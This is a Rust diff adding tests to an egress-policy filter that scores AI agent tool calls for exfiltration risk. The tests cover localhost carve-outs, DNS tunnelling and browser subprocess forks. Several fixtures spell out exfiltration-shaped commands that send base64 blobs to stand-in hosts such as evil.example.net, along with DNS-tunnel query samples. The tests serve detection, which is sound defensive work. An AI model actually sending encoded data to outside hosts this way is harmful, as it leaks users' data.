         let ctx = make_ctx(ToolCallType::NetConnect {
@@ -1459,19 +1954,6 @@ mod tests {
             "raw:af_packet score must be >= 7.0 to reach deny range, got {}",
             result.score
         );
-    }
-
-    #[tokio::test]
-    async fn test_af_netlink_net_connect_scores_high() {
-        let filter = EgressPolicyFilter::with_defaults();
-        let ctx = make_ctx(ToolCallType::NetConnect {
-            address: "raw:af_netlink".into(),
-            port: 0,
-        });
-        let result = filter.evaluate(&ctx).await.unwrap();
-        assert!(result.matched);
-        assert_eq!(result.rule_id, "raw-socket");
-        assert!(result.score >= 7.0);
     }
 
     #[tokio::test]
@@ -1633,6 +2115,122 @@ mod tests {
         let result = filter.evaluate(&ctx).await.unwrap();
         assert!(result.matched);
         assert_eq!(result.rule_id, "private-address-egress");
+    }
+
+    // ── Allowed-local destinations (allow_private_ip = true) ─────────
+    //
+    // With the default `allow_private_ip = true`, a private/loopback host is
+    // deliberately permitted — so it must not fall through to
+    // `unknown-destination` (the FP that queued every headless-browser run
+    // against a localhost dev server at 4.5).
+
+    /// The reported shape: a downloaded Chromium launched headless against a
+    /// loopback dev server. The launch URL's host is loopback, so with
+    /// `allow_private_ip = true` egress-policy must stay silent.
+    #[tokio::test]
+    async fn test_process_spawn_browser_localhost_url_not_scored() {
+        let filter = EgressPolicyFilter::with_defaults();
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/tmp/scratch/chromium-92/chrome-linux/chrome".into(),
+            args: vec![
+                "--headless".into(),
+                "--disable-gpu".into(),
+                "--screenshot=/tmp/scratch/shot.png".into(),
+                "--window-size=1280,1024".into(),
+                "http://localhost:5173/".into(),
+            ],
+        });
+
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(
+            !result.matched,
+            "browser spawn against localhost must not score, got rule_id={} message={}",
+            result.rule_id, result.message
+        );
+    }
+
+    /// Same launch with `allow_private_ip = false`: the private-address gate
+    /// must keep full coverage — the carveout is strictly opt-in via config.
+    #[tokio::test]
+    async fn test_process_spawn_localhost_url_reviewed_when_private_disallowed() {
+        let cfg = EgressPolicyConfig {
+            allow_private_ip: false,
+            ..EgressPolicyConfig::default()
+        };
+        let filter = EgressPolicyFilter::from_config(cfg);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/tmp/scratch/chromium-92/chrome-linux/chrome".into(),
+            args: vec!["--headless".into(), "http://localhost:5173/".into()],
+        });
+
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched);
+        assert_eq!(result.rule_id, "private-address-egress");
+    }
+
+    /// A NetConnect to a private-range host is not an "unknown destination"
+    /// when private egress is allowed. (Loopback connects on the supervisor
+    /// path were already quiet via the session allowlist; this covers the
+    /// LLM path and non-allowlisted private hosts.)
+    #[tokio::test]
+    async fn test_netconnect_private_ip_not_unknown_destination() {
+        let filter = EgressPolicyFilter::with_defaults();
+        let ctx = make_ctx(ToolCallType::NetConnect {
+            address: "192.168.1.10".into(),
+            port: 8080,
+        });
+
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(
+            !result.matched,
+            "private-range connect must not score with allow_private_ip=true, got rule_id={}",
+            result.rule_id
+        );
+    }
+
+    /// `curl` against the operator's own localhost service is routine local
+    /// development — the review command token must be suppressed just as it
+    /// is for a trusted-domain fetch (FP §5.4).
+    #[tokio::test]
+    async fn test_curl_to_localhost_token_suppressed() {
+        let filter = EgressPolicyFilter::with_defaults();
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/curl".into(),
+            args: vec!["-s".into(), "http://localhost:3000/api/health".into()],
+        });
+
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(
+            !result.matched,
+            "curl to localhost must not queue with allow_private_ip=true, got rule_id={}",
+            result.rule_id
+        );
+    }
+
+    /// The suppression must not ride along for a mixed command: a localhost
+    /// URL next to an untrusted public destination still fires the token rule.
+    #[tokio::test]
+    async fn test_curl_localhost_plus_untrusted_host_still_fires() {
+        let filter = EgressPolicyFilter::with_defaults();
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/curl".into(),
+            args: vec![
+                "http://localhost:3000/api/export".into(),
+                "https://attacker-controlled-for-test.example/up".into(),
+            ],
+        });
+
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched);
+        assert!(
+            matches!(
+                result.rule_id.as_str(),
+                "review-egress-command-token" | "unknown-destination"
+            ),
+            "unexpected rule_id: {}",
+            result.rule_id
+        );
+        assert!(result.score >= filter.review_score());
     }
 
     // ── Profile overlay tests ────────────────────────────────────────
@@ -2107,5 +2705,435 @@ mod tests {
         assert!(!is_loopback_bind_address("::ffff:0.0.0.0"));
         // Junk input doesn't panic.
         assert!(!is_loopback_bind_address("not-an-ip"));
+    }
+
+    // ---- W1: exfil-shape scoring for spawned URL tools (ProcessSpawn arm) ----
+
+    /// A filter that shape-scores but treats every host as untrusted unless it
+    /// is one of `trusted`. `review_unknown_destinations` is off so the only
+    /// review-scored signal on an untrusted host is the exfil shape itself —
+    /// this isolates the W1 code from the (equal-scored) unknown-destination
+    /// signal, which would otherwise win the tie by running first.
+    fn shape_filter(trusted: &[&str]) -> EgressPolicyFilter {
+        let cfg = EgressPolicyConfig {
+            review_unknown_destinations: false,
+            trusted_domains: trusted.iter().map(|s| (*s).to_string()).collect(),
+            ..EgressPolicyConfig::default()
+        };
+        EgressPolicyFilter::from_config(cfg)
+    }
+
+    // A 60-char base64-alphabet blob — over the 40-char base64_min_chunk_len.
+    const EXFIL_BLOB: &str = "SGVsbG9Xb3JsZFRoaXNJc0FCYXNlNjRQYXlsb2FkVGhhdElzUXVpdGVMb25n";
+
+    /// A spawned URL tool (curl/wget/aria2c/etc. — here a bespoke uploader so
+    /// the outbound-command-token rule doesn't mask the signal) carrying a
+    /// base64 blob in the URL query to an UNTRUSTED host is shape-scored.
+    #[tokio::test]
+    async fn spawn_url_query_blob_to_untrusted_host_is_shape_scored() {
+        let filter = shape_filter(&[]);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/myuploader".into(),
+            args: vec![format!("https://evil.example.net/up?d={EXFIL_BLOB}")],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(
+            result.matched,
+            "exfil-shaped URL to untrusted host must score"
+        );
+        assert_eq!(
+            result.rule_id, "base64-chunking",
+            "expected exfil shape signal, got {} ({})",
+            result.rule_id, result.message
+        );
+    }
+
+    /// The blob need not live in the URL — a `-d <blob>` POST body on the
+    /// argv to an untrusted host is shape-scored too (serves the user's
+    /// "POST/PUT/PATCH data scored higher" ask for direct spawns).
+    #[tokio::test]
+    async fn spawn_post_body_blob_to_untrusted_host_is_shape_scored() {
+        let filter = shape_filter(&[]);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/myuploader".into(),
+            args: vec![
+                "-d".into(),
+                EXFIL_BLOB.into(),
+                "https://evil.example.net/up".into(),
+            ],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched);
+        assert_eq!(result.rule_id, "base64-chunking", "got {}", result.message);
+    }
+
+    /// The same blob to a TRUSTED destination must NOT be shape-scored — a
+    /// signed/token URL to a routine host is expected, and firing here would
+    /// add an approval on the happy path (the explicit no-new-approvals
+    /// constraint). The destination trust reduction wins instead.
+    #[tokio::test]
+    async fn spawn_blob_to_trusted_host_is_not_shape_scored() {
+        let filter = shape_filter(&["trusted.example.com"]);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/myuploader".into(),
+            args: vec![format!("https://trusted.example.com/up?d={EXFIL_BLOB}")],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert_eq!(
+            result.rule_id, "trusted-destination",
+            "trusted host must not shape-score, got {} ({})",
+            result.rule_id, result.message
+        );
+        assert!(
+            result.score < 0.0,
+            "trusted destination should reduce score"
+        );
+    }
+
+    /// A spawn with NO URL/destination in its argv is never shape-scored even
+    /// when an argument looks base64-shaped — `git checkout <40-hex-sha>` and
+    /// `docker run img@sha256:<hex>` must not queue. This is the gate that
+    /// keeps the high-volume ProcessSpawn path free of SHA/digest false
+    /// positives.
+    #[tokio::test]
+    async fn spawn_without_destination_skips_shape_scoring() {
+        let filter = shape_filter(&[]);
+        // 40-char hex commit SHA — a base64-alphabet run over the threshold.
+        let sha = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2";
+        for (command, args) in [
+            (
+                "/usr/bin/git",
+                vec!["checkout".to_string(), sha.to_string()],
+            ),
+            (
+                "/usr/bin/docker",
+                vec!["run".to_string(), format!("img@sha256:{sha}{sha}")],
+            ),
+        ] {
+            let ctx = make_ctx(ToolCallType::ProcessSpawn {
+                command: command.into(),
+                args,
+            });
+            let result = filter.evaluate(&ctx).await.unwrap();
+            assert_ne!(
+                result.rule_id, "base64-chunking",
+                "{command} with no destination must not shape-score ({})",
+                result.message
+            );
+            assert_ne!(result.rule_id, "high-entropy-segment", "{command}");
+        }
+    }
+
+    /// The specific FP guarded against: `curl https://raw.githubusercontent.com/
+    /// u/r/<40-hex-sha>/f` — the SHA path segment is a >40-char base64 run, but
+    /// githubusercontent is profile/operator-trusted, so no shape signal is
+    /// added. (curl still draws its own outbound-command-token review; the
+    /// assertion is only that the trusted SHA path adds no exfil shape on top.)
+    #[tokio::test]
+    async fn spawn_trusted_github_sha_url_adds_no_shape_signal() {
+        let filter = shape_filter(&["githubusercontent.com"]);
+        let sha = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2";
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "curl".into(),
+            args: vec![format!(
+                "https://raw.githubusercontent.com/u/r/{sha}/file.txt"
+            )],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert_ne!(result.rule_id, "base64-chunking", "{}", result.message);
+        assert_ne!(result.rule_id, "high-entropy-segment", "{}", result.message);
+    }
+
+    // ---- W1: scheme-LESS URL forms (curl/wget default to http://) ----
+
+    /// `curl example.com/up?d=<blob>` — no `scheme://`, so the URL regex never
+    /// sees it. The bare-destination scanner still recognises the untrusted
+    /// host and opens the shape gate, so the exfil blob is scored.
+    #[tokio::test]
+    async fn spawn_schemeless_url_query_blob_to_untrusted_host_is_shape_scored() {
+        let filter = shape_filter(&[]);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/myuploader".into(),
+            args: vec![format!("evil.example.net/up?d={EXFIL_BLOB}")],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched, "scheme-less exfil URL must score");
+        assert_eq!(
+            result.rule_id, "base64-chunking",
+            "expected exfil shape signal, got {} ({})",
+            result.rule_id, result.message
+        );
+    }
+
+    /// `<tool> -d <blob> evil.example.net` — scheme-less bare host as the POST
+    /// target, blob in the consumed `-d` value. The scanner skips the flag's
+    /// value, finds the untrusted bare host, and the gate opens.
+    #[tokio::test]
+    async fn spawn_schemeless_post_body_blob_to_untrusted_host_is_shape_scored() {
+        let filter = shape_filter(&[]);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/myuploader".into(),
+            args: vec!["-d".into(), EXFIL_BLOB.into(), "evil.example.net".into()],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched);
+        assert_eq!(result.rule_id, "base64-chunking", "got {}", result.message);
+    }
+
+    /// A scheme-less URL to a TRUSTED bare host is still not shape-scored — the
+    /// scanner recognises the host as trusted, the gate stays shut, no approval
+    /// is added.
+    #[tokio::test]
+    async fn spawn_schemeless_blob_to_trusted_host_is_not_shape_scored() {
+        let filter = shape_filter(&["trusted.example.com"]);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/myuploader".into(),
+            args: vec![format!("trusted.example.com/up?d={EXFIL_BLOB}")],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert_ne!(result.rule_id, "base64-chunking", "{}", result.message);
+        assert_ne!(result.rule_id, "high-entropy-segment", "{}", result.message);
+    }
+
+    // ---- W4: DNS-tunnelling shape detection ----
+
+    // A 34-char high-entropy label (entropy ≈ 4.7): trips the long-label rule
+    // but is under the 40-char base64-chunking length, so `dns-tunneling` is the
+    // sole signal in the DnsQuery-arm tests below.
+    const DNS_TUNNEL_LABEL: &str = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7";
+
+    #[test]
+    fn dns_tunneling_signal_flags_long_high_entropy_label() {
+        let sig = dns_tunneling_signal(&format!("{DNS_TUNNEL_LABEL}.example.com"), "A")
+            .expect("long high-entropy label should flag");
+        assert!(!sig.high_risk_qtype);
+    }
+
+    #[test]
+    fn dns_tunneling_signal_flags_txt_encoded_subdomain() {
+        // 24-char encoded label — below the 32-char long-label bar, caught only
+        // by the data-bearing-qtype (TXT) rule.
+        let sig = dns_tunneling_signal("a1b2c3d4e5f6g7h8i9j0k1l2.tunnel.example.com", "TXT")
+            .expect("TXT with encoded subdomain should flag");
+        assert!(sig.high_risk_qtype);
+    }
+
+    #[test]
+    fn dns_tunneling_signal_ignores_normal_hostnames() {
+        for (domain, qtype) in [
+            ("api.github.com", "A"),
+            ("a.b.c.d.example.com", "A"),
+            ("optimizationguide-pa.googleapis.com", "A"),
+            // Same host over TXT — a dictionary label under the entropy floor.
+            ("optimizationguide-pa.googleapis.com", "TXT"),
+            // Routine mail-auth TXT lookups have short subdomains.
+            ("_dmarc.example.com", "TXT"),
+            ("selector1._domainkey.example.com", "TXT"),
+            // A long but low-entropy (dictionary) internal name.
+            ("very.long.internal.service.name.example.com", "TXT"),
+        ] {
+            assert!(
+                dns_tunneling_signal(domain, qtype).is_none(),
+                "{domain} ({qtype}) must not read as tunnelling"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn dns_query_arm_scores_tunnelling() {
+        let filter = EgressPolicyFilter::with_defaults();
+        let ctx = make_ctx(ToolCallType::DnsQuery {
+            domain: format!("{DNS_TUNNEL_LABEL}.example.com"),
+            query_type: "A".into(),
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert_eq!(result.rule_id, "dns-tunneling", "got {}", result.message);
+    }
+
+    /// A TXT tunnel scores strictly higher than an A tunnel (data-bearing qtype
+    /// weight), so the signal ranks it above the base review score.
+    #[tokio::test]
+    async fn dns_txt_tunnel_scored_higher() {
+        let filter = EgressPolicyFilter::with_defaults();
+        let ctx = make_ctx(ToolCallType::DnsQuery {
+            domain: "a1b2c3d4e5f6g7h8i9j0k1l2.tunnel.example.com".into(),
+            query_type: "TXT".into(),
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert_eq!(result.rule_id, "dns-tunneling", "got {}", result.message);
+        assert!(
+            result.score >= 5.0,
+            "TXT tunnel should carry the qtype weight, got {}",
+            result.score
+        );
+    }
+
+    /// A routine resolution of a normal hostname draws no tunnelling signal.
+    #[tokio::test]
+    async fn dns_query_arm_ignores_normal_hostname() {
+        let filter = EgressPolicyFilter::with_defaults();
+        let ctx = make_ctx(ToolCallType::DnsQuery {
+            domain: "api.github.com".into(),
+            query_type: "A".into(),
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert_ne!(result.rule_id, "dns-tunneling");
+    }
+
+    // ---- C2: exfil_shape metadata for the precision meta-rule ----
+
+    /// A shaped payload to an untrusted host stamps the `exfil_shape` flag on the
+    /// egress-policy result (even when unknown-destination wins the collapsed
+    /// rule_id), so the C2 meta-rule can combine it with reputation/taint.
+    #[tokio::test]
+    async fn exfil_shape_metadata_set_for_untrusted_shaped_spawn() {
+        let filter = shape_filter(&[]);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/myuploader".into(),
+            args: vec![format!("https://evil.example.net/up?d={EXFIL_BLOB}")],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert_eq!(
+            result.metadata.get("exfil_shape").and_then(|v| v.as_bool()),
+            Some(true),
+        );
+    }
+
+    /// W2: a shaped payload to a *trusted* host DETECTS the shape (flag set, so
+    /// C2 can escalate under corroborating reputation/taint) but does NOT
+    /// standalone-score it — the winning result stays the trust reduction, so it
+    /// adds no approval on its own.
+    #[tokio::test]
+    async fn exfil_shape_to_trusted_host_flagged_but_not_scored() {
+        let filter = shape_filter(&["trusted.example.com"]);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/myuploader".into(),
+            args: vec![format!("https://trusted.example.com/up?d={EXFIL_BLOB}")],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        // Flag set for C2...
+        assert_eq!(
+            result.metadata.get("exfil_shape").and_then(|v| v.as_bool()),
+            Some(true),
+        );
+        // ...but not standalone-scored: the trust reduction wins, no queue.
+        assert_eq!(result.rule_id, "trusted-destination");
+        assert!(result.score < 0.0);
+    }
+
+    // ---- A#3: browser --type= subprocess forks are not egress ----
+
+    /// A Chromium helper-process fork (`--type=…`) or the crashpad handler must
+    /// not draw the outbound-command-token — it's an internal fork, not a fetch.
+    #[tokio::test]
+    async fn browser_subprocess_spawn_not_egress_flagged() {
+        let filter = EgressPolicyFilter::with_defaults();
+        for (cmd, args) in [
+            (
+                "/opt/google/chrome/chrome",
+                vec![
+                    "--type=gpu-process".to_string(),
+                    "--field-trial-handle=1,i,2,3".to_string(),
+                ],
+            ),
+            (
+                "google-chrome",
+                vec!["--type=renderer".to_string(), "--lang=en-US".to_string()],
+            ),
+            (
+                "/opt/google/chrome/chrome_crashpad_handler",
+                vec![
+                    "--monitor-self".to_string(),
+                    "--database=/tmp/x".to_string(),
+                ],
+            ),
+        ] {
+            let ctx = make_ctx(ToolCallType::ProcessSpawn {
+                command: cmd.into(),
+                args,
+            });
+            let result = filter.evaluate(&ctx).await.unwrap();
+            assert!(
+                !result.matched || result.rule_id != "review-egress-command-token",
+                "{cmd} subprocess must not egress-flag, got {}",
+                result.rule_id
+            );
+        }
+    }
+
+    /// The MAIN browser launch (a URL, no `--type=`) is NOT a subprocess — its
+    /// navigation target is still egress-scored (the exfil surface).
+    #[tokio::test]
+    async fn browser_main_launch_with_url_still_scored() {
+        let filter = shape_filter(&[]);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "google-chrome".into(),
+            args: vec![
+                "--headless".into(),
+                format!("https://evil.example.net/x?d={EXFIL_BLOB}"),
+            ],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched, "main launch with a URL must be scored");
+    }
+
+    /// A routine spawn with no shape draws no flag.
+    #[tokio::test]
+    async fn exfil_shape_metadata_absent_for_clean_spawn() {
+        let filter = shape_filter(&[]);
+        let ctx = make_ctx(ToolCallType::ProcessSpawn {
+            command: "/usr/bin/git".into(),
+            args: vec!["status".into()],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.metadata.get("exfil_shape").is_none());
+    }
+
+    // ---- W2: trust-gate the ShellExec/HttpRequest shape score ----
+
+    /// A shell command carrying a base64/SHA-shaped arg but NO network
+    /// destination is not shape-scored — fixes the SHA/digest FP on ShellExec,
+    /// matching ProcessSpawn.
+    #[tokio::test]
+    async fn shellexec_shaped_arg_without_destination_not_scored() {
+        let filter = shape_filter(&[]);
+        let sha = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"; // 40 hex ≥ base64 min
+        let ctx = make_ctx(ToolCallType::ShellExec {
+            command: "git".into(),
+            args: vec!["checkout".into(), sha.into()],
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert_ne!(result.rule_id, "base64-chunking", "{}", result.message);
+        assert!(result.metadata.get("exfil_shape").is_none());
+    }
+
+    /// HttpRequest to a TRUSTED host with a shaped query flags for C2 but is not
+    /// standalone-scored — fixes the Path-1 signed-URL FP (previously scored
+    /// unconditionally).
+    #[tokio::test]
+    async fn httprequest_shaped_query_to_trusted_host_flagged_not_scored() {
+        let filter = shape_filter(&["trusted.example.com"]);
+        let ctx = make_ctx(ToolCallType::HttpRequest {
+            method: "GET".into(),
+            url: format!("https://trusted.example.com/x?d={EXFIL_BLOB}"),
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert_eq!(
+            result.metadata.get("exfil_shape").and_then(|v| v.as_bool()),
+            Some(true),
+        );
+        assert_eq!(result.rule_id, "trusted-destination");
+    }
+
+    /// HttpRequest to an UNTRUSTED host with a shaped query is still scored.
+    #[tokio::test]
+    async fn httprequest_shaped_query_to_untrusted_host_scored() {
+        let filter = shape_filter(&[]);
+        let ctx = make_ctx(ToolCallType::HttpRequest {
+            method: "GET".into(),
+            url: format!("https://evil.example.net/x?d={EXFIL_BLOB}"),
+        });
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert_eq!(result.rule_id, "base64-chunking", "{}", result.message);
     }
 }
